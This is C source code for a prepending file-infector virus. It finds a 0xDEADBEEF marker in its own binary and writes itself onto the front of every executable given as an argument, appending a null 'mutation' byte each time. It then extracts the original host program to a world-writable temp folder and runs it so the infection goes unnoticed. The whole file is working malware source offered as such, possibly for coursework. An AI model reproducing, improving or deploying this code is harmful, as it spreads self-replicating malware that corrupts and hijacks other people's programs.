#include <unistd.h>
#include <stdio.h>
#include <stdlib.h> 
#include <sys/stat.h>
#include <fcntl.h>

/*
* Executes the file specified by filename.
* If execution fails, prints an error and exits.
*/
void runFile(const char *filename, char *const args[]) {
    execv(filename, args);
    // If it returns, execv failed
    perror("execv failed");
    exit(EXIT_FAILURE);
}

/*
 * Searches a file for the last occurrence of byte pattern 0xDEADBEEF.
 * Returns 1 if found, 0 otherwise.
 * Seeks to the position immediately after the pattern if found.
 */
long findDeadbeef(FILE *file) {
    // Seed to beginning of the file
    if (fseek(file, 0, SEEK_SET) < 0) {
        perror("Could not seek to beginning of file");
        return -1;
    }
    // Read first 4 bytes of file and check if they are deadbeef
    long patternPos = -1;
    unsigned char buffer[4];
    size_t bytesRead = fread(buffer, 1, sizeof(buffer), file);
    if (bytesRead < 4) {
        return -1;
    }
    if (buffer[0] == 0xde && buffer[1] == 0xad && buffer[2] == 0xbe && buffer[3] == 0xef) {
        long currentPos = ftell(file);
        if (currentPos == -1) {
            perror("ftell failed");
            return -1;
        }
        patternPos = currentPos;
    }

    // Use a sliding window to search for the pattern
    int nextByte;
    while ((nextByte = fgetc(file)) != EOF) {
        // Shift buffer left and add new byte
        buffer[0] = buffer[1];
        buffer[1] = buffer[2];
        buffer[2] = buffer[3];
        buffer[3] = (unsigned char)nextByte;

        if (buffer[0] == 0xde && buffer[1] == 0xad && buffer[2] == 0xbe && buffer[3] == 0xef) {
            long currentPos = ftell(file);
            if (currentPos == -1) {
                perror("ftell failed");
                return -1;
            }
            patternPos = currentPos;
        }
    }
    return patternPos;
}

/*
 * Copies content from src file to dest file from startPos to endPos.
 * If endPos is EOF, copies to the end of the file.
 * Returns 0 on success, -1 on failure.
 */
int copyFile(FILE *src, FILE *dest, long startPos, long endPos) {
    // If endPos is EOF, set it to the end of the file
    if (endPos == EOF) {
        if (fseek(src, 0, SEEK_END) != 0) {
            perror("fseek to end failed");
            return -1;
        }
        endPos = ftell(src);
        if (endPos == -1) {
            perror("ftell failed");
            return -1;
        }
    }

    // Seek to start position
    if (fseek(src, startPos, SEEK_SET) != 0) {
        perror("fseek failed");
        return -1;
    }

    // Copy content one byte at a time
    unsigned char buffer[1];
    size_t bytesRead;
    size_t totalBytesCopied = 0;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), src)) > 0) {
        if (fwrite(buffer, 1, bytesRead, dest) != bytesRead) {
            perror("fwrite failed");
            return -1;
        }
        totalBytesCopied += bytesRead;
        if (totalBytesCopied >= endPos - startPos) {
            break;
        }
    }
    return 0;
}

/*
 * Infects a file
 */
int infectFile(char *fileToInfectName, char *virusBinName) {

    // Create temporary file
    char *tempFileName = "concatBin";
    FILE *fileToInfect = fopen(fileToInfectName, "rb+");
    if (fileToInfect == NULL) {
        printf("Could not open file to infect: %s\n", fileToInfectName);
        return -1;
    }
    FILE *virusFile = fopen(virusBinName, "rb");
    if (virusFile == NULL) {
        printf("Could not open virus binary: %s\n", virusBinName);
        fclose(fileToInfect);
        return -1;
    }
    FILE *tempFile = fopen(tempFileName, "ab+");
    if (tempFile == NULL) {
        printf("Could not create temporary file\n");
        fclose(fileToInfect);
        fclose(virusFile);
        return -1;
    }

    // Copy virus to temp file
    long deadbeefPos = findDeadbeef(virusFile);
    if (deadbeefPos == -1) {
        printf("Could not find deadbeef in virus binary\n");
        fclose(fileToInfect);
        fclose(virusFile);
        fclose(tempFile);
        remove(tempFileName);
        return -1;
    }
    if (copyFile(virusFile, tempFile, 0, deadbeefPos) < 0) {
        printf("Could not copy virus to temp file\n");
        fclose(fileToInfect);
        fclose(virusFile);
        fclose(tempFile);
        remove(tempFileName);
        return -1;
    }
    if (copyFile(fileToInfect, tempFile, 0, EOF) < 0) {
        printf("Could not copy infected file to temp file\n");
        fclose(fileToInfect);
        fclose(virusFile);
        fclose(tempFile);
        remove(tempFileName);
        return -1;
    }
    fclose(virusFile);

    // Insert byte of useless data (mutation)
    char mutationByte = 0x00;
    if (fwrite(&mutationByte, 1, 1, tempFile) != 1) {
        perror("Could not write mutation byte to temp file");
        fclose(fileToInfect);
        fclose(tempFile);
        remove(tempFileName);
        return -1;
    }

    // Copy temp file to infected file
    fseek(fileToInfect, 0, SEEK_SET);
    fseek(tempFile, 0, SEEK_SET);
    if (copyFile(tempFile, fileToInfect, 0, EOF) < 0) {
        printf("Could not copy temp file to infected file\n");
        fclose(fileToInfect);
        fclose(tempFile);
        return -1;
    }

    fclose(fileToInfect);
    fclose(tempFile);
    remove(tempFileName);
    return 0;
}

/*
 * Main function
 */
int main(int argc, char *argv[]) {
    printf("Virus running\n");

    // Open own binary
    FILE *ownBin = fopen(argv[0], "rb");
    if (ownBin == NULL) {
        perror("Failed to open own binary");
        return EXIT_FAILURE;
    }

    // Find deadbeef in own file
    long deadbeefPos = findDeadbeef(ownBin);
    if (deadbeefPos == -1) {
        printf("Could not find deadbeef in own binary\n");
        fclose(ownBin);
        return EXIT_FAILURE;
    }

    // Make tmp directory if it doesn't exist
    struct stat sb;
    if (!(stat("./tem", &sb) == 0 && S_ISDIR(sb.st_mode))) {
        if (mkdir("./tem", 0777) == -1) {
            perror("Failed to create directory");
            fclose(ownBin);
            return EXIT_FAILURE;
        }
    }

    // Create temporary file
    char *tempFilename = malloc(256);
    sprintf(tempFilename, "./tem/%s", argv[0]);
    FILE *tempFile = fopen(tempFilename, "wb");
    if (tempFile == NULL) {
        perror("Failed to create temporary file");
        fclose(ownBin);
        return EXIT_FAILURE;
    }
    if (chmod(tempFilename, 0777) == -1) {
        perror("Failed to set permissions on temporary file");
        fclose(ownBin);
        fclose(tempFile);
        return EXIT_FAILURE;
    }

    // Copy everything after deadbeef to a temp file
    if (copyFile(ownBin, tempFile, deadbeefPos, EOF) == -1) {
        printf("Could not copy to temporary file\n");
        fclose(ownBin);
        fclose(tempFile);
        return EXIT_FAILURE;
    }
    fclose(ownBin);
    fclose(tempFile);

    // If any files were passed as arguments, infect them
    for (int i = 1; i < argc; i++) {
        char *fileToInfectName = argv[i];
        FILE *fileToInfect = fopen(fileToInfectName, "rb");
        if (fileToInfect == NULL) {
            continue; // Skip to next file (could not open, arg may not be a file)
        }
        fclose(fileToInfect);
        infectFile(fileToInfectName, argv[0]);
    }

    // Execute the temp file
    runFile(tempFilename, argv);

    return EXIT_SUCCESS;
}
